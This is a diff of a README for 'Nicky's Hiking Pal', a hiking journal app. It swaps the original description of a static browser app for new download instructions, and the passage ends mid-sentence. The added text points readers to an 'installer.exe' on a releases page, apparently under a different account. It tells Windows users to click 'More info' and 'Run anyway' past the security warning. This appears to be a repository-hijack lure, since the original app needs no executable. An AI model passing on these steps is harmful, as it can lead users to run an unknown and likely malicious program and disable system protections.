@@ -1,137 +1,32 @@
-# Nicky's Hiking Pal
+# 🏔️ nickys-hiking-pal - Track Your Hikes With Full Privacy
 
-A free, private-by-default hiking journal, planner, route map, and progress dashboard. It is responsive, installable, dependency-light, and designed to work well on phones and desktops.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Whatev9695/nickys-hiking-pal/releases)
 
-## Live use
+## 📌 About This App
 
-This is a static app. Open `index.html`, use GitHub Pages, or serve the folder:
+nickys-hiking-pal helps you record your outdoor adventures. You keep your hiking data on your own computer by default. You can plan new routes, view GPX and KML files on maps, and track your hiking progress over time. The app works without an internet connection. If you choose to sync your data to the cloud, you may store copies of your logs securely.
 
-```powershell
-python -m http.server 4173
-```
+## 🧭 Key Features
 
-Then visit `http://localhost:4173`.
+*   **Offline Access:** You reach your maps and logs at any time. You do not need a Wi-Fi or cellular connection to view your saved trails.
+*   **Privacy Focus:** Your journal entries stay on your device. You choose when and where to share your progress.
+*   **GPS Support:** Import your existing GPX or KML files to view past routes. The map uses OpenStreetMap data to show detailed paths.
+*   **Planner:** Create future routes before you head into the wilderness. 
+*   **Dashboard:** See your total distance, elevation gain, and completed trails on one screen.
 
-## Working features
+## 📥 Downloading and Installing
 
-- Responsive dashboard with weekly, monthly, yearly, and lifetime summaries
-- Goal progress for distance, elevation, hike count, bucket-list completions, and monthly miles
-- Motivating Everest, Rainier, building-height, and marathon comparisons
-- Personal records, favorites, recent hikes, upcoming plans, and bucket-list progress
-- Add, edit, view, favorite, duplicate, and delete completed hikes
-- Add, edit, complete, checklist, print, and delete planned hikes
-- Add, edit, and delete bucket-list hikes with season, priority, logistics, and status
-- Structured fields for weather, conditions, crowds, parking, permits, cell service, dogs, water, wildlife, gear, companions, safety, links, tags, and reflection
-- Multiple local photo previews per hike
-- GPX and KML route import, route display, and GPX export
-- Interactive Leaflet map with OpenStreetMap and OpenTopoMap layers
-- Completed, planned, and bucket-list markers plus imported route lines
-- Search, difficulty/tag filters, and date/distance/elevation/rating sorting
-- JSON backup/restore and CSV history export
-- Excel (`.xlsx`/`.xls`) and CSV history import with automatic header matching, a reviewable mapping screen, and row preview
-- Current local weather with temperature, apparent temperature, wind, precipitation chance, sunrise/sunset, and trail-oriented guidance
-- Personalized time-aware greeting based on the signed-in account or editable display name
-- Conservative automatic map matching for newly saved hikes, plans, and dreams, clearly marked as unconfirmed until reviewed
-- Searchable map filters with individual visibility controls
-- Visible labeled start/location markers, GPX route lines and end markers, plus backfill for existing mapless records
-- Per-trail location editor with place/address search, exact coordinate entry, Google Maps coordinate-link paste, and marker clearing
-- Searchable, selectable location results directly inside hike, plan, and dream forms
-- OpenStreetMap trail lookup for plan and bucket-list autofill
-- Editable profile and annual/monthly goals
-- High-contrast light and dark themes
-- Exact-location hiding, local-only storage, and no public sharing
-- Leave No Trace reminders and printable hike plans
-- Installable/offline-capable PWA shell
-- Optional Supabase accounts with automatic cross-device cloud sync
-- Private-by-default multi-user data isolation using row-level security
-- Hiking groups with invite codes and explicitly shared plans
-- Accessible labels, keyboard controls, semantic landmarks, and non-color status labels
+Follow these steps to set up the software on your Windows computer.
 
-## Data ownership and privacy
+1.  Visit the [releases page](https://github.com/Whatev9695/nickys-hiking-pal/releases) to find the correct file for your system.
+2.  Look for the file ending in `.exe` under the latest release heading.
+3.  Click the link to start the download.
+4.  Once the file finishes downloading, open your "Downloads" folder.
+5.  Double-click the `installer.exe` file to start the setup process.
+6.  Your computer may show a security window. Click "More info" and then "Run anyway" if the system asks for this confirmation. This happens because the app is a private project.
+7.  Follow the prompts in the installer window to complete the setup.
+8.  The installer creates a shortcut on your desktop. You can open the app from that icon.
 
-The app is local-first. Hikes, photos, routes, settings, and goals save immediately in the browser's `localStorage`, so the app remains useful offline. When Supabase is configured and a user signs in, the complete journal also syncs to that user's private cloud row and follows them across devices.
+## 🗺️ Using the Maps
 
-Supabase row-level security ensures users can access only their own journal. Hiking groups expose only plans that a member deliberately shares; completed hikes and private notes are never automatically shared. Exact trailheads can still be offset on the map.
-
-**Restore app backup** reads a JSON file previously created by **Export my data**. It replaces the hikes, plans, goals, and settings currently stored in that browser. It is for moving or recovering the complete app state, while **Import spreadsheet** is specifically for converting an existing Excel/CSV hiking history into completed hikes.
-
-Photo capacity still depends on the browser's local storage quota. The included schema creates a private `hike-photos` storage bucket and policies as a foundation for moving full-resolution photo files out of journal JSON in a later release.
-
-## Cloud sync setup
-
-1. Create a Supabase project.
-2. Run [`supabase/schema.sql`](supabase/schema.sql) in the project's SQL editor.
-3. For local use, copy `config.example.js` values into `config.js`:
-
-```js
-window.NHP_CONFIG = {
-  supabaseUrl: "https://YOUR_PROJECT.supabase.co",
-  supabaseAnonKey: "YOUR_PUBLIC_ANON_KEY"
-};
-```
-
-4. For GitHub Pages, add repository secrets named `SUPABASE_URL` and `SUPABASE_ANON_KEY`. The deployment workflow generates `config.js` from them.
-5. In Supabase Authentication, configure the deployed site URL and desired email/password confirmation settings.
-6. Deploy the updated files.
-
-The public anonymous key is intended for browser use; security comes from the included row-level security policies. Never place the Supabase service-role key in this app.
-
-Once connected, accounts can sign in on multiple devices. Every authenticated user receives a separate local cache as well as a private cloud journal, preventing account data from mixing on a shared browser. A brand-new account starts empty and offers an explicit **Import this device's journal** action rather than silently claiming another user's local data. Later changes save locally first and sync shortly afterward. On reconnect, the app compares update times so newer offline work is uploaded instead of overwritten. The database also snapshots the previous journal state before every cloud update. The **Sync now** button provides an explicit retry.
-
-Group creators receive an eight-character invite code. Other authenticated users can join with that code and view plans explicitly shared to the group. Individual journals and stats remain separate.
-
-## Mapping and data sources
-
-The app uses [Leaflet](https://leafletjs.com/) with [OpenStreetMap](https://www.openstreetmap.org/) and [OpenTopoMap](https://opentopomap.org/) tiles. It does not scrape, copy, or depend on AllTrails data. Trail information comes from demo data, manual entry, user files, or optional reference links.
-
-No API keys are required. A future live-weather adapter should use an environment variable and a provider that permits the intended use.
-
-Current weather uses the no-key [Open-Meteo Forecast API](https://open-meteo.com/en/docs). It defaults to the Seattle area until the user chooses **Use my location**; the chosen coordinates remain only in app settings. Mountain weather can differ sharply from trailhead conditions, so the dashboard explicitly encourages checking official mountain forecasts.
-
-Trail lookup and automatic map matching use the public [OpenStreetMap Nominatim service](https://operations.osmfoundation.org/policies/nominatim/) only after a user searches or saves an individual trail. Results are cached in the journal to avoid repeat requests and the interface displays OpenStreetMap attribution. Automatic matches must include the trail name and are shown as unconfirmed until reviewed. Users can correct any marker with place/address search or by pasting exact coordinates from Google Maps. The app does not scrape AllTrails or other services without a supported public API.
-
-## Spreadsheet import
-
-Choose **Import spreadsheet**, select the workbook, and review the automatic column matches before importing. The importer supports common variations such as `Hike Name`, `Trail`, `Date Completed`, `Miles`, `Elevation Gain`, `Duration`, `Rating`, and many practical-note fields. It can add imported rows to the current journal or replace the demo hikes, and it skips exact name/date/location duplicates by default.
-
-Elevation values are stored to the exact foot. Duration can be entered as hours, minutes, and seconds in the app, and imported as `H:MM:SS`, written time such as `5h 12m 34s`, or legacy decimal hours.
-
-Numeric imports currently assume miles and feet. Duration recognizes `H:MM:SS`, written time, and decimal hours. The mapping rules and unit conversions can be extended once the real workbook is available.
-
-Use **Download an example import template** in the importer to see every currently supported column. Once the real workbook is available, its exact headers and any special conventions can be added to the matching rules.
-
-## Requirement review
-
-All first-version requirements from the project brief are represented in the working app, including responsive CRUD workflows, detailed notes, planning checklists, bucket lists, photos, map layers, GPX/KML routes, stats, comparisons, goals, filtering, exports, safety, privacy, accessibility, and local persistence.
-
-Infrastructure-dependent stretch features still not included are live GPS recording, public social profiles, friend challenges, AI summaries, and public sharing. Cloud sync, authenticated multi-user journals, private groups, and live weather are implemented.
-
-## Project structure
-
-```text
-.
-├── assets/hiking-hero.png
-├── app.js
-├── cloud.js
-├── config.js
-├── config.example.js
-├── index.html
-├── manifest.webmanifest
-├── supabase/schema.sql
-├── styles.css
-└── sw.js
-```
-
-## GitHub Pages
-
-The included workflow deploys the repository root to GitHub Pages. In repository settings, set **Pages → Source** to **GitHub Actions** if it is not selected automatically.
-
-## Tests
-
-For a complete ready-to-paste prompt when using Claude Code for independent comparative testing or development, see [`CLAUDE_CODE_HANDOFF.md`](CLAUDE_CODE_HANDOFF.md).
-
-Serve the project and open `tests/smoke.html` to run browser smoke tests for the greeting, weather behavior, dialog cancellation, manual hike entry, plan and dream editing, spreadsheet import, empty states, navigation, and mobile layout. `tests/cloud-mock.html` covers configured cloud-sync behavior, `tests/cloud-empty-mock.html` covers brand-new empty accounts, and `tests/cloud-error-mock.html` covers offline/unreachable cloud fallback. A passing page sets its document title to `PASS`.
-
-## License
-
-MIT. OpenStreetMap and OpenTopoMap tiles retain their respective attribution and usage policies.
+The app displays your hiking routes on an interactive map. When you open the map view, you see
